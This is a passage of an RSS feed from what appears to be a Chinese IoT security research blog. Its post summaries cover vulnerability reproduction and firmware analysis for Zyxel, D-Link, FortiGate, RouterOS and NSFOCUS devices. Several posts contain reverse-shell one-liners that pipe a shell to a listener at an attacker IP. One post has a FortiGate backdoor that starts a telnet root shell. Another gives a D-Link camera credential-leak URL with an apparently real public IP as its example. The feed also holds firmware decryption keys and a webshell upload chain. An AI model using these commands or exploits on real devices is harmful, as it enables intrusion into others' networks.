我们退出qemu，搜索一下php-fastcgi相关的文件：
这里根据linux目录，可以判断我们需要启动 /etc/init.d/php7-fastcgi。</description>
    </item>
    
    <item>
      <title>CVE-2023-28771 合勤IPSec VPN服务命令注入漏洞</title>
      <link>https://jellyfish-pro.github.io/posts/cve-2023-28771-%E5%90%88%E5%8B%A4ipsec-vpn%E6%9C%8D%E5%8A%A1%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%9C%AA%E6%B5%8B%E8%AF%95%E9%80%9A%E8%BF%87/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://jellyfish-pro.github.io/posts/cve-2023-28771-%E5%90%88%E5%8B%A4ipsec-vpn%E6%9C%8D%E5%8A%A1%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%9C%AA%E6%B5%8B%E8%AF%95%E9%80%9A%E8%BF%87/</guid>
      <description>CVE-2023-28771 合勤IPSec VPN服务命令注入漏洞（未测试通过） 漏洞简介 该漏洞广泛存在于合勤防火墙设备中：
ATP防火墙（固件版本在4.60 至 5.35） USG FLEX（固件版本在4.60至5.35） VPN（固件版本在内4.60至5.35） ZyWALL/USG（固件版本在4.60至4.73） 并在网络上有完整的分析文章：[CVE-2023-28771 RCE分析与EXP](CVE-2023-28771 RCE分析与EXP (qq.com))
在文章中有给出exp.
通过这个exp，可以大概猜测到漏洞出在处理ikev2协议有关
不过该漏洞没有买到设备，所以只能使用exp去找ip测试。
寻找特征 固件解密 漏洞的特征我们需要去固件中找，固件则可以直接去官网下载（官网只能下载最近几个版本的固件）
同时，固件是加密过的zip文件，具体的解密原理：[Zyxel设备固件提取与口令破解](Zyxel设备固件提取与口令破解|NOSEC安全讯息平台 - 白帽汇安全研究院)
这里直接演示解压的过程。
官网下载后是一个压缩包，解压后的文件夹如下：
里面有一个xxx.ri的文件，该文件可以直接通过binwake解压出来，这里面存放着解压xxx.bin的密码
binwalk -Me1 473AAAB0C0.ri 解压后可以看到一个zld_fsextract文件，这个文件就是用来解压xxx.bin的二进制文件
这里我们file看一下这个文件：
是mips n32的架构，这里我们先将zld_fsextract文件复制到xxx.bin同级目录，然后使用qemu来进行用户级模拟：
./qemu-mipsn32-static ./zld_fsextract 473AAAB0C0.bin ./unzip -s extract -e code 直接使用qemu模拟的话会报错：
这里的权限不够不能使用sudo来解决，因为这里需要的是设备的权限，而不是物理机的权限。
这里我们需要使用strace命令，来看看zld_fsextract文件的执行情况：
strace -f -s 199 ./qemu-mipsn32-static ./zld_fsextract 473AAAB0C0.bin ./unzip -s extract -e code 在函数的调用链中，可以看到一个execveat函数。而这个函数参数里的50QLc3QbsoeAX53dREVw8rTxwc5IAYYHa.eD45qyvU8TbD63Td/dUUaR7ilJGJc就是解压密码
然后使用7z，输入密码，就可以解压：
这里面有一个compress.img，这个就是根目录系统，直接解压就行：
比较特征 这里我们选择的是compress\usr\local\zyxel-gui\htdocs\images\login.css
这个文件里有直接记录当前reset.css版本号，并且可以直接访问：
通过这一点就可以判断目标ip的固件版本
ip测试 这里直接使用的上面的exp，判断版本号后也无法成功返回shell。并且没有设备，并不知道问题出在哪里</description>
    </item>
    
    <item>
      <title>dlink dir-878通过串口获取shell</title>
      <link>https://jellyfish-pro.github.io/posts/dlink-dir-878%E9%80%9A%E8%BF%87%E4%B8%B2%E5%8F%A3%E8%8E%B7%E5%8F%96shell/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://jellyfish-pro.github.io/posts/dlink-dir-878%E9%80%9A%E8%BF%87%E4%B8%B2%E5%8F%A3%E8%8E%B7%E5%8F%96shell/</guid>
      <description>dlink dir-878通过串口获取shell 写在前面 焊针脚真的是一个体力活，不难，但是没有好的工具，实施起来就太麻烦了。
文章只会介绍怎么找到GND和TX,然后通过排除法找到RX，而对于焊针脚不会详细描写。
焊了针脚后其实也不能直接获得shell，还需要一些操作，这一部分会详细写。
判断针脚 我的万用表的配置是这样的，因为我接触到iot设备的电流基本是3V，所以选择的是V而不是mV。
然后黑线抵住wiki的卡扣，红线抵住针脚：
通电后，挨个测试针脚，一般来说是0V的就是GND。
然后重启路由器，测试剩下的三个针脚，如果有一个针脚在3V和1点几V左右来回跳动，那么说明这大概率是一个TX。
那么剩下的VCC和RX，两个做排除法就好了。在实际dir-878中VCC是3V而RX是0.2V。
获取shell 焊上针脚，找到GND和TX后我们就可以尝试连接串口了，dir-878的波特率为56000。
进入串口，并且等待启动信息输出完毕，我们可以看到一个有着cmd&amp;gt;输入终端，这个终端可以输入任何字符，但是不会有回显：
这里我们去搜索一下这个字符串：
可以看到在如下的文件中出现可这个字符串，其实我们可以直接确定就在rc这个二进制文件中，因为这四个文件，只有rc和启动相关。
通过cmd&amp;gt;我们可以直接找到交叉引用。通过这一段的逻辑，我们可以知道这里是在比较密码，而密码来自于console_pwd这个nvram环境变量。
那我们直接搜索这个console_pwd这个字符串：
这里找到一个类似的东西，我们可以去试一试这个dlink
发现密码确实是这个东西</description>
    </item>
    
    <item>
      <title>Dlink-DCS摄像头系列 账户密码泄露漏洞（未进行分析）</title>
      <link>https://jellyfish-pro.github.io/posts/dlink-dcs%E6%91%84%E5%83%8F%E5%A4%B4%E7%B3%BB%E5%88%97-%E8%B4%A6%E6%88%B7%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E%E6%9C%AA%E8%BF%9B%E8%A1%8C%E5%88%86%E6%9E%90/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://jellyfish-pro.github.io/posts/dlink-dcs%E6%91%84%E5%83%8F%E5%A4%B4%E7%B3%BB%E5%88%97-%E8%B4%A6%E6%88%B7%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E%E6%9C%AA%E8%BF%9B%E8%A1%8C%E5%88%86%E6%9E%90/</guid>
      <description>Dlink-DCS摄像头系列 账户密码泄露漏洞（未进行分析） 该漏洞可以泄露用户的账号和密码，使用账号和密码可以登录页面。
可以在网页上直接访问url，也可以使用脚本获得
如果要访问url的话则需要使用如下的url：
http://xxx.xxx.xxx.xxx:xxxx/config/getuser?index=0 获得账户密码后直接访问ip就可登录：
http://xxx.xxx.xxx.xxx:xxxx 若要使用python脚本：
USEG: ./exp http://ip:portor./exp https://ip:port 例如：
http://14.100.101.68:8080/config/getuser?index=0 </description>
    </item>
    
    <item>
      <title>dlink固件解密分析</title>
      <link>https://jellyfish-pro.github.io/posts/dlink%E5%9B%BA%E4%BB%B6%E8%A7%A3%E5%AF%86%E5%88%86%E6%9E%90/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://jellyfish-pro.github.io/posts/dlink%E5%9B%BA%E4%BB%B6%E8%A7%A3%E5%AF%86%E5%88%86%E6%9E%90/</guid>
      <description>dlink固件解密分析 写在前面 之前解压固件基本都是用的工具，碰到加密的就只能上设备去提取。
这次正好有机会碰到需要模拟dlink867，需要解压固件，正好也有资料。
就用这次机会当敲门石，从dlink推广到更多的设备固件解密
寻找基本信息 一般来说，当我们要更新固件，会先通过网页上传固件。所以我们可以通过上传固件所访问的文件、数据去寻找解密的二进制文件。
不过这里因为我手上没有dlink867设备，所以就直接使用了资料中说的二进制文件。/bin/imgdecrypt
我们可以file看一下：
可以看到这是一个mips的二进制文件，那么放入ida中查看一下：
可以看到这个二进制文件的main函数十分的清楚，就是分为加密和解密
当然我们关注的是解密函数，那么我们进入解密函数查看一下，同时我们也要注意传入解密函数的参数：
这里可以看到这个函数的大致流程，同时这里我们可以看到程序会判断运行时传入的参数个数。
我已经将命令注释在了上面。/bin/imgdecrypt /tmp/firmware.img
至于怎么寻找这个命令怎么找到的，我们可以使用以下的命令：
grep -lire imgdecrypt 在这个prog-cgi中就可以找到启动命令。
解密逻辑 上面我们了解到了一些基本的信息，现在我们来说dlink固件解密的流程：
通过这个程序的流程，我们可以看到，这里处理了两个东西：
key firmware 对key的处理 我们先说说对key的处理，我们进入这个init_key的函数：
这里有四个参数，他们的作用如下：
这里我们需要注意的是第一个、第三个、第四个参数。
第一个参数是密钥的密文，32个字节 第三个参数是密钥的密钥，16个字节 第四个参数是AES的ivec向量，16个字节 同时我们可以看到这三个参数全来自一个地方。off_4130A0
ciphertext = &amp;#39;C8D32F409CACB347C8D26FDCB9090B3C&amp;#39;key = &amp;#39;358790034519F8C8235DB6492839A73F&amp;#39;ivec = &amp;#39;98C9D8F0133D0695E2A709C8B69682D4&amp;#39; 这样我们就可以将固件的密钥给解密出来。
对固件的处理 这里我们进入了do_dec函数，这个函数中的逻辑比较简单，简单来说，程序会分别计算固件解密前的hash和解密后的hash，然后再计算解密后的固件+长度+密钥的hash。
其实，如果我们只要求解密固件的话，我们只需要关注dec函数即可。
但是在看dec函数之前我们需要先了解一下dlink固件的结构：
可以看到，被加密的固件前0xDC个字节存放着magic字段、加密固件的长度、解密后固件的长度、ivec向量和hash值。
了解了这个结构后，我们就可以看看二进制文件究竟干了什么：
首先，要检查加密固件的magic字段。
随后将密文部分+dec_img_len一起计算固件hash，并且和解密后固件的hash比较
然后将密文+dec_img_len+密钥+ivec向量，进行解密固件
随后再将解密后的固件+enc_img_len一起计算固件hash，并且和加密固件的hash进行比较
最后再将解密后的固件+enc_img_len+密钥一起计算hash，并且和解密+长度+密钥的hash进行比较
解密脚本 现在我们知道解密需要哪些参数，并且参数是从哪里来的，那么我们直接解密就可以了：
#!/usr/bin/python3import pathlibimport sysfrom Crypto.Cipher import AESclass Dlink_dec:def __init__(self, inf, outf):self.</description>
    </item>
    
    <item>
      <title>FortiGate飞塔获取shell方法</title>
      <link>https://jellyfish-pro.github.io/posts/fortigate%E9%A3%9E%E5%A1%94%E8%8E%B7%E5%8F%96shell%E6%96%B9%E6%B3%95/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://jellyfish-pro.github.io/posts/fortigate%E9%A3%9E%E5%A1%94%E8%8E%B7%E5%8F%96shell%E6%96%B9%E6%B3%95/</guid>
      <description>FortiGate飞塔获取shell方法 获取根目录文件 我们首先找到安装飞塔虚拟机的路径：
看到这两个VMware硬盘文件，将其中这个较大的复制出来，添加到Ubuntu下：
随后在Ubuntu中就可以看到这个硬盘：
我们将这个256M大小的区域挂载到我们指定的文件夹下：
sudo mount /dev/nvme0n1p1 /mnt/fortigate/ 就可以看到被打包好的飞塔根文件目录：
我们将这个文件复制出来，然后解压：
gzip -d rootfs.gzsudo cpio -idmv &amp;lt; ./rootfssudo chroot . /sbin/xz --check=sha256 -d /bin.tar.xzsudo chroot . /sbin/ftar -xf /bin.tar patch原init 随后我们找到./bin/init，将其放入ida中，这里ida可能要加载半天。
在main函数中，我们可以看到如下的逻辑：
请注意这两个if语句。check_xor()和check_rootfs()这两个函数的主要功能是对系统和根文件系统进行检查，因为后面我们要更改根文件系统，所以这里需要将这两个if给patch掉：
第一点：
patch前：
patch后：
第二点：
patch前：
patch后：
随后我们保存patch，将保存下来的init替换原来的./bin/init。
替换了init后，我们需要将busybox放入bin目录下：
同时，删除原来bin目录下的sh文件，替换为软连接指向busybox
rm -rf ./bin/shsudo ln -s /bin/busybox sh 接着我们写一个后门文件：
#include &amp;lt;stdio.h&amp;gt;void shell(){system(&amp;#34;/bin/busybox id&amp;#34;, 0, 0);system(&amp;#34;/bin/busybox killall sshd &amp;amp;&amp;amp; /bin/busybox telnetd -l /bin/sh -b 0.</description>
    </item>
    
    <item>
      <title>qemu-system模拟dlink-dir867</title>
      <link>https://jellyfish-pro.github.io/posts/qemu-system%E6%A8%A1%E6%8B%9Fdlink-dir867/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://jellyfish-pro.github.io/posts/qemu-system%E6%A8%A1%E6%8B%9Fdlink-dir867/</guid>
      <description>qemu-system模拟dlink-dir867 写在前面 之前也模拟过dlink的设备，不过当时更注重记录qemu的使用，而这次
记录更侧重对dlink的操作。
至于模拟成功没有，只能说成功了但是没有完全成功（如成
参考文章：
Debugging D-Link: Emulating firmware and hacking hardware (greynoise.io)
固件解密 这次我想要模拟的是DIR-867-US（美版），固件版本为： 如果直接binwalk解压，是解压不了的：
而在参考文章中有提到：
At the start of the file is a 4-byte sequence that maps to the ASCII characters “SHRS”.
A quick Google search for “SHRS firmware” turns up relevant results, indicating that we’re on the right track.
如何是“SHRS”打头的四个字节，就可以使用下面的工具进行解压：
0xricksanchez/dlink-decrypt: D-Link firmware decryption PoC (github.com)
python3 dlink-dec.py -i DIR-867_FW1.30B07.bin -o DIR-867_FW1.30B07.dec.bin 对解密脚本的分析，会晚一点进行~~（应该，大概，可能，八成，会写在最后）~~
文件系统分析 解压后可以得到一个名叫cpio-root的文件夹，首先我们还是去看看inittab：
随后我们查看这两个文件，发现makedevlinks.sh的主要作用是建立一些*/dev的管道，而init_system则是一个二进制文件，里面就包含lighttpd*的启动命令：</description>
    </item>
    
    <item>
      <title>RouterOS软路由线程同步漏洞</title>
      <link>https://jellyfish-pro.github.io/posts/routeros%E7%BA%BF%E7%A8%8B%E5%90%8C%E6%AD%A5%E6%BC%8F%E6%B4%9E/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://jellyfish-pro.github.io/posts/routeros%E7%BA%BF%E7%A8%8B%E5%90%8C%E6%AD%A5%E6%BC%8F%E6%B4%9E/</guid>
      <description>RouterOS软路由线程同步漏洞 漏洞简介 该漏洞存在于RouterOS 6.38.4及以下版本。漏洞原理为未对 alloca()函数分配内存的大小做限制，导致alloca()函数可分配超过本线程内存块大小的内存，从而非法访问其他线程的内存。
漏洞复现 RouterOS环境搭建 因为该漏洞为软路由漏洞，且有x86架构，故我们可使用VMware直接模拟。
首先我们需要先下载Routeros的镜像，或者直接去官网下载镜像
这里我选择的是 RouterOS 6.38.4
然后使用VMware模拟，这里我们指出几个需要注意的点：
这里可以选择Linux 3.x 内核。
随后创建完成虚拟机后，需要修改虚拟机配置：
这里需要将 硬盘(SCSI)改为IDE
随后启动RouterOS虚拟机，一般说来，第一次开机会选择需要安装的服务这里我们直接输入&#39;a&#39;选择所有，然后输入&#39;i&#39;进行安装，然后根据提示一直按 &#39;y&#39;就可以：
安装好后使用 admin：&#39;&#39;登录RouterOS。
然后输入setup命令，根据提示设置ip地址
最后打开浏览器，访问刚刚设定的IP地址，如能访问，则证明安装完成。
RouterOS越狱 因为RouterOS原生操作系统是基于Linux系统复写的一套新操作系统。原生的RouterOS甚至连busybox都没有，更别说后面的调试了。所以我们需要对其进行越狱处理。
这里我们使用的是 mikrotik-tools工具，该工具可以帮助我们进入RouterOS的Linux系统。
使用方法也很简单：
#git clone https://github.com/0ki/mikrotik-tools.git#cd mikrotik-tools#./exploit-backup/exploit_full.sh 随后按照提示输入对应信息就可以。
**注：**因为该方法使用的ssh远程连接RouterOS，所以一些太过古老的版本会提示ssh找不到对应的加密方式。
出现截图中的语句则表示越狱成功。
接下来我们就可以使用telnet连接RouterOS了。(用户密码为 devel:&#39;&#39;)
RouterOS漏洞复现 这里我们使用Chimay-Red项目中的exp.
**注：**该exp需要python2版本的pwntools模块。(直接改成符合python3的语法就行，只需要修改几个字符类型就行。别去安装python2的pwntools环境，浪费时间。别问我怎么知道的)
首先我们先获取当前RouterOS版本中存在漏洞的二进制文件：
#./tools/getROSbin.py 6.38.4 x86 /nova/bin/www www_6384_x86 随后使用nc监听端口：
#nc -lnvp 8080 然后使用exp，执行命令：
#./StackClash_x86.py 192.168.113.129 80 www_binary &amp;#34;mknod /ram/f p; /bin/telnet 192.168.113.128 8080 &amp;lt; /ram/f | /bin/bash &amp;gt;/ram/f 2&amp;gt;&amp;amp;1&amp;#34; 漏洞代码分析 在上面的exp利用中，我们看到了，漏洞点是在 /nova/bin/www 中的 alloca函数，因此我们将刚刚拿到的二进制文件，放入IDA。</description>
    </item>
    
    <item>
      <title>绿盟NG3 G2000L防火墙文件上传和路径穿越组合漏洞</title>
      <link>https://jellyfish-pro.github.io/posts/lvmeng_ng3_g2000l_firewall_upload_pathtraversal/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://jellyfish-pro.github.io/posts/lvmeng_ng3_g2000l_firewall_upload_pathtraversal/</guid>
      <description>绿盟NG3 G2000L防火墙文件上传和路径穿越组合漏洞 漏洞介绍 测试环境时在绿盟NG3 G2000L防火墙上进行的，固件版本：V6.0.1.58；引擎版本：V6.0.3.134。
根据网络上就传的poc信息，该漏洞组合可能广泛存在于绿盟的整个NG系列防火墙上。不过因为防火墙和固件版本不一样，导致最终的发包内容有所区别。
文件上传漏洞：该漏洞是因为开发时并没有考虑到特殊情况，从而产生漏洞 路径穿越漏洞：该漏洞是因为文件上传漏洞造成的次生漏洞，因为攻击者上传了特殊文件，从而导致攻击者可以控制本不能控制的参数，从而造成路径穿越。 环境复现 对绿盟防火墙环境的复现可以既简单又困难 矛盾文学（雾）
困难的地方在于，在网络上找不到绿盟防火墙的完整固件。在其官网中也只能找到升级包，而并非完整的固件包。
但如果能够直接购买到设备，那就会变得特别的简单。
无法获得底层shell 当然拿到设备后，可以发现该设备有很多账户，但是只有develop账户可以进入最底层的Linux。可这个账户的密码，是根据一套算法实时计算的，只有寻找绿盟客服才能获得密码。
所以我们只能采取其他方法。
漏洞分析 文件上传漏洞 这里我们首先使用bp模拟发包：
这里首先上传了一个名sess_82c13f359d0dd8f51c29d658a9c8ac71的文件，其实通过这个文件名称，我们就可以大概猜到其作用：想要保存一个session对话。
一般sess打头的文件都是放在*/tmp*目录下，但以防万一，我们还是在代码中找了一下：
./nsfocus/web/rest4espc/ipsv1/dispatch/v1/device/bugsInfo/resourse.php 通过代码，可以发现上传路径就是*/tmp*。
同时，在这个文件中还可以看到一个身份判断：
这里将$token和$contents进行比较，$contents来自*/tmp/token*文件，而$token来自我们GET传输的数据。
那么我们如何绕过这个验证呢？答案是什么都不做。
因为如果我们访问的sess文件中没有$contents的值，则php就会将$contents置为空。同时如果我们发包时，不使用GET传递参数，那么php会将$token也置为空。两个值都置空了，那两个值不就相等了？PHP 是最好的语言
路径穿越漏洞 通过bp的包，我们可以看到，这时的session_id是最开始我们上传的文件名
那么这个包，是怎么导致路径穿越的呢？根据上面这个包访问的路径：
./nsfocus/web/apache2/sslvpn/mail/include/header_main.php 可以看到这里包含了一个叫做compose.php的文件，文件本来的意思是读取session中&amp;quot;lang&amp;quot;的值，并将这个值拼接成一个路径。
但是我们在伪造的sess文件中存入了特殊的&amp;quot;lang&amp;quot;的值：
lang|s:52:&amp;#34;../../../../../../../../../../../../../../../../tmp/&amp;#34; 为了直观显示被修改后的效果，这里我修改了原文件，使其输出$lang：
通过这样的方法，我们就控制了$lang的值，从而让PHP文件包含了我们指定文件夹下的compose.php文件
漏洞利用 通过上面的漏洞分析，我们可以将利用链总结如下：
上传一个伪造session，使第二个漏洞包含*/tmp下的compose.php*文件。 然后再上传一个含有一句话马的名字为compose.php的文件到*/tmp*下 最后访问header_main.php，触发路径穿越，导致包含到*/tmp下刚刚上传的compose.php*文件。 最后exp 上传第一个包：
上传第二个包：
最后触发路径穿越：
./test2.py 192.168.1.1 &amp;#34;rm /tmp/f; mknod /tmp/f p; /bin/telnet 192.168.1.3 8080 &amp;lt; /tmp/f | /bin/bash &amp;gt;/tmp/f 2&amp;gt;/tmp/f&amp;#34; </description>
    </item>
    
  </channel>
</rss>
